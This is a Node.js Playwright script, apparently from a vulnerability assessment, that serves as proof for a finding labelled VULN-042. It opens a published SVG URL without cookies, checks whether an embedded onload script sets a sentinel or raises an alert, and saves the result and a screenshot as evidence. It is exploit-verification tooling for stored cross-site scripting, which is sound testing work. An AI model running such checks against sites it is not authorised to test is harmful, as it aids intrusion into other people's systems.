// VULN-042 — Playwright DOM-execution proof.
// Top-level navigation (no cookies, no auth) directly to the published
// public/<id>.svg URL, asserting the embedded <svg onload=...> executes.
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const HERE = '/work/exploits/VULN-042';

(async () => {
  const state = JSON.parse(fs.readFileSync(path.join(HERE, 'state.json'), 'utf8'));
  const evidenceDir = path.join(HERE, 'evidence');
  fs.mkdirSync(evidenceDir, { recursive: true });

  // Fresh, cookie-less context -- this must work for a completely
  // unauthenticated visitor.
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();

  let dialogMessage = null;
  page.on('dialog', async (dialog) => {
    dialogMessage = dialog.message();
    try { await dialog.dismiss(); } catch (e) { /* ignore */ }
  });

  console.log(`[INFO] navigating (no cookies) to ${state.url}`);
  try {
    // 'commit' is enough -- the SVG onload fires as soon as the document
    // parses; waiting for the full 'load' event on a non-HTML top-level
    // resource combined with a blocking alert() dialog can hang the
    // navigation promise itself.
    await page.goto(state.url, { waitUntil: 'commit', timeout: 15000 });
  } catch (e) {
    console.log(`[INFO] navigation settled with: ${e.message}`);
  }

  // Give the SVG onload handler (and its alert()) time to fire and be
  // auto-dismissed by the dialog handler above.
  await page.waitForTimeout(2000);

  let fired = false;
  try {
    fired = await page.evaluate((sentinel) => !!window[sentinel], state.sentinel);
  } catch (e) {
    console.log(`[INFO] evaluate failed: ${e.message}`);
  }

  // Write the decisive result BEFORE attempting the (best-effort)
  // screenshot, so a screenshot hiccup can never lose the real verdict.
  const result = { fired, dialogMessage };
  fs.writeFileSync(path.join(evidenceDir, 'result.json'), JSON.stringify(result, null, 2));
  console.log(`[RESULT] ${JSON.stringify(result)}`);

  try {
    await page.screenshot({ path: path.join(evidenceDir, 'fired.png'), fullPage: true, timeout: 8000 });
  } catch (e) {
    console.log(`[INFO] high-level screenshot failed (${e.message}), falling back to raw CDP capture`);
    try {
      const cdp = await context.newCDPSession(page);
      const shot = await cdp.send('Page.captureScreenshot', { format: 'png' });
      fs.writeFileSync(path.join(evidenceDir, 'fired.png'), Buffer.from(shot.data, 'base64'));
      console.log('[INFO] CDP screenshot fallback succeeded');
    } catch (e2) {
      console.log(`[INFO] CDP screenshot fallback also failed (non-fatal): ${e2.message}`);
    }
  }

  await browser.close();
})().catch((e) => {
  console.error('[FAIL]', e);
  fs.mkdirSync(path.join(HERE, 'evidence'), { recursive: true });
  const resultPath = path.join(HERE, 'evidence', 'result.json');
  if (!fs.existsSync(resultPath)) {
    fs.writeFileSync(resultPath, JSON.stringify({ fired: false, error: String(e) }));
  }
  process.exit(1);
});
